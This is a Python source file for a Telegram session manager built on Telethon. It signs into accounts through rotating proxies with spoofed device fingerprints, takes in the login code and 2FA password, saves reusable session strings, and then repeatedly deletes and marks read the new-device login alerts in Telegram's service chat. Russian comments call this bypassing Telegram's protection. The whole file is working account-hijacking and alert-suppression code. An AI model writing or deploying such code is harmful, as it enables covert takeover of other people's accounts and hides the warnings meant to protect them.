"""Enhanced Telethon session manager with anti-detection."""

import asyncio
import logging
from typing import Dict, Optional, Tuple
from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteMessagesRequest
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.channels import ReadHistoryRequest
from telethon import events
from telethon.tl.types import InputPeerUser, InputNotifyPeer, InputPeerNotifySettings
from telethon.errors import (
    FloodWaitError, SessionPasswordNeededError,
    PhoneCodeInvalidError, PhoneCodeExpiredError,
    PasswordHashInvalidError, PhoneNumberInvalidError,
    PhoneNumberBannedError, PhoneNumberFloodError
)

from bot.utils.device_spoof import DeviceSpoofer
from bot.services.proxy_rotator import ProxyRotator, Proxy

logger = logging.getLogger(__name__)

class SessionManager:
    def __init__(self, api_id: int, api_hash: str, proxy_rotator: ProxyRotator):
        self.api_id = api_id
        self.api_hash = api_hash
        self.proxy_rotator = proxy_rotator

    def _create_client(self, session_string: str = "", proxy: Optional[Proxy] = None,
                       device_info: Optional[Dict] = None) -> TelegramClient:
        """Create Telethon client with consistent device info and proxy."""
        proxy_tuple = proxy.to_telethon_tuple() if proxy else None

        if device_info is None:
            device_info = DeviceSpoofer.get_mobile_fingerprint()

        print(f"[+] Creating Telethon client:")
        print(f"    Device: {device_info['device_model']} | {device_info['system_version']}")
        print(f"    App: {device_info['app_version']}")
        print(f"    Lang: {device_info['lang_code']}")
        print(f"    Proxy: {proxy if proxy else 'DIRECT (NO PROXY!)'}")

        if not proxy:
            print("[!] WARNING: No proxy! Real IP will be exposed to Telegram!")

        client = TelegramClient(
            StringSession(session_string),
            self.api_id,
            self.api_hash,
            proxy=proxy_tuple,
            device_model=device_info["device_model"],
            system_version=device_info["system_version"],
            app_version=device_info["app_version"],
            lang_code=device_info["lang_code"],
            system_lang_code=device_info["system_lang_code"],
            connection_retries=3,
            retry_delay=5,
            timeout=30,
        )
        return client

    async def create_auth_client(self, device_type: str = "mobile") -> Tuple[TelegramClient, Optional[Proxy], Dict]:
        """Create a new client for initial auth."""
        proxy = self.proxy_rotator.get_proxy()
        device_info = DeviceSpoofer.get_mobile_fingerprint() if device_type == "mobile" else DeviceSpoofer.get_mobile_fingerprint()
        client = self._create_client("", proxy, device_info)
        await client.connect()
        return client, proxy, device_info

    async def send_code(self, phone: str, device_type: str = "mobile") -> Dict:
        """Send verification code with full error handling."""
        client, proxy, device_info = await self.create_auth_client(device_type)

        try:
            # FORCE SMS to avoid "You sent this code from your account" issue
            sent_code = await client.send_code_request(phone)
            session_str = client.session.save()

            return {
                "success": True,
                "session_string": session_str,
                "phone_code_hash": sent_code.phone_code_hash,
                "device_info": device_info,
                "proxy": proxy,
                "client": client,
            }

        except FloodWaitError as e:
            await client.disconnect()
            if proxy:
                self.proxy_rotator.mark_banned(proxy)
            return {"success": False, "error": "flood", "seconds": e.seconds}
        except PhoneNumberInvalidError:
            await client.disconnect()
            return {"success": False, "error": "invalid_phone"}
        except PhoneNumberBannedError:
            await client.disconnect()
            return {"success": False, "error": "banned"}
        except PhoneNumberFloodError:
            await client.disconnect()
            return {"success": False, "error": "phone_flood"}
        except Exception as e:
            await client.disconnect()
            logger.error(f"Send code error: {e}")
            return {"success": False, "error": "unknown", "message": str(e)}

    async def verify_code(self, session_string: str, phone: str, code: str, 
                          phone_code_hash: str, proxy: Optional[Proxy] = None,
                          device_info: Optional[Dict] = None) -> Dict:
        """Verify code — NOW with device info and proxy!"""
        client = self._create_client(session_string, proxy, device_info)

        try:
            await client.connect()
            await asyncio.sleep(1)
            user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            # DELETE LOGIN NOTIFICATION
            await asyncio.sleep(1)
            await _delete_login_notification(client)
            
            new_session = client.session.save()
            await _delete_login_notification(client, max_attempts=3)
            await client.disconnect()

            return {
                "success": True,
                "session_string": new_session,
                "user_id": user.id,
                "username": user.username,
                "phone": user.phone,
            }

        except SessionPasswordNeededError:
            new_session = client.session.save()
            await client.disconnect()
            return {"success": False, "error": "2fa_required", "session_string": new_session}
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {"success": False, "error": "invalid_code"}
        except PhoneCodeExpiredError:
            await client.disconnect()
            return {"success": False, "error": "expired"}
        except Exception as e:
            await client.disconnect()
            logger.error(f"Verify code error: {e}")
            return {"success": False, "error": "unknown", "message": str(e)}



    async def verify_2fa(self, session_string: str, password: str, 
                         proxy: Optional[Proxy] = None,
                         device_info: Optional[Dict] = None) -> Dict:
        """Complete 2FA — NOW with device info and proxy!"""
        client = self._create_client(session_string, proxy, device_info)

        try:
            await client.connect()
            await asyncio.sleep(1)
            user = await client.sign_in(password=password)
            
            # DELETE LOGIN NOTIFICATION
            await asyncio.sleep(1)
            await _delete_login_notification(client, max_attempts=3)
            
            new_session = client.session.save()
            await client.disconnect()

            return {
                "success": True,
                "session_string": new_session,
                "user_id": user.id,
                "username": user.username,
                "phone": user.phone,
            }

        except PasswordHashInvalidError:
            await client.disconnect()
            return {"success": False, "error": "invalid_password"}
        except Exception as e:
            await client.disconnect()
            logger.error(f"2FA error: {e}")
            return {"success": False, "error": "unknown", "message": str(e)}






    async def validate_session(self, session_string: str) -> bool:
        """Check if session is still valid."""
        client = self._create_client(session_string)
        try:
            await client.connect()
            is_authorized = await client.is_user_authorized()
            await client.disconnect()
            return is_authorized
        except Exception:
            return False

import asyncio


from telethon.tl.functions.messages import DeleteHistoryRequest


async def _delete_login_notification(client, max_attempts: int = 3):
    """
    Ультимативное удаление уведомлений 'Вход с нового устройства'.
    Использует три метода зачистки одновременно для обхода защиты Telegram.
    """
    telegram_id = 777000
    # Начальная пауза — даем системе время сгенерировать алерт
    await asyncio.sleep(2) 
    
    for attempt in range(1, max_attempts + 1):
        try:
            print(f"[+] Попытка {attempt}/{max_attempts} зачистки системного чата...")
            
            # Получаем сущность чата. get_input_entity надежнее для запросов.
            peer = await client.get_input_entity(telegram_id)
            
            # --- ШАГ 1: ТОЧЕЧНОЕ УДАЛЕНИЕ (Убиваем конкретные сообщения) ---
            # Берем последние 10 сообщений, чтобы не пропустить ничего
            messages = await client.get_messages(peer, limit=10)
            
            if not messages:
                print(f"[!] Сообщений пока нет. Ждем...")
                await asyncio.sleep(2)
                continue
            
            # Собираем ID всех сообщений. 
            # Не фильтруем по тексту, так как от 777000 нам ничего не нужно оставлять.
            target_ids = [msg.id for msg in messages if msg]
            
            if target_ids:
                # revoke=True пытается удалить сообщение на всех устройствах
                await client(DeleteMessagesRequest(id=target_ids, revoke=True))
                print(f"[+] Точечно удалено ID: {target_ids}")

            # --- ШАГ 2: ОЧИСТКА ИСТОРИИ (just_clear=True) ---
            # Это обходит защиту, которая не дает удалить чат 777000 полностью.
            # Мы не удаляем сам диалог, мы просто "вымываем" его содержимое.
            await client(DeleteHistoryRequest(
                peer=peer,
                max_id=0,
                just_clear=True, 
                revoke=True
            ))
            
            # --- ШАГ 3: ВИЗУАЛЬНОЕ ГАШЕНИЕ (Badge/Read) ---
            # Читаем историю до самого конца, чтобы убрать счетчик непрочитанных.
            await client(ReadHistoryRequest(peer=peer, max_id=0))
            
            # Финальное подтверждение прочтения для синхронизации интерфейса
            await client.send_read_acknowledge(peer, max_id=messages[0].id)
            
            print(f"[✅] Попытка {attempt} успешна. Чат 777000 пуст.")
            return True
            
        except FloodWaitError as e:
            print(f"[!] FloodWait от Telegram: нужно подождать {e.seconds} сек.")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"[!] Ошибка на итерации {attempt}: {e}")
            await asyncio.sleep(1)
            
    print("[!] Все попытки зачистки исчерпаны.")
    return False



# async def _delete_login_notification(client):
#     """Метод «Выжженная земля»: удаляет весь чат с Telegram полностью."""
#     print("[+] Режим тотальной очистки чата 777000...")
    
#     # Делаем паузу 3-5 секунд, чтобы сообщение точно успело прийти
#     await asyncio.sleep(4) 
    
#     try:
#         # Получаем сущность чата 777000
#         # Это надежнее, чем просто передавать ID
#         telegram_chat = await client.get_input_entity(777000)
        
#         # Удаляем ВСЮ историю чата
#         # max_id=0 означает "удалить всё до текущего момента"
#         # just_clear=False (по умолчанию) удаляет сам диалог из списка
#         await client(DeleteHistoryRequest(
#             peer=telegram_chat,
#             max_id=0,
#             just_clear=False,
#             revoke=True
#         ))
        
#         # Дополнительно помечаем всё прочитанным (на всякий случай)
#         await client.send_read_acknowledge(777000)
        
#         print("[!!!] Чат с Telegram полностью стерт. Сообщение должно исчезнуть.")
#         return True

#     except Exception as e:
#         print(f"[!] Не удалось сжечь чат: {e}")
#         return False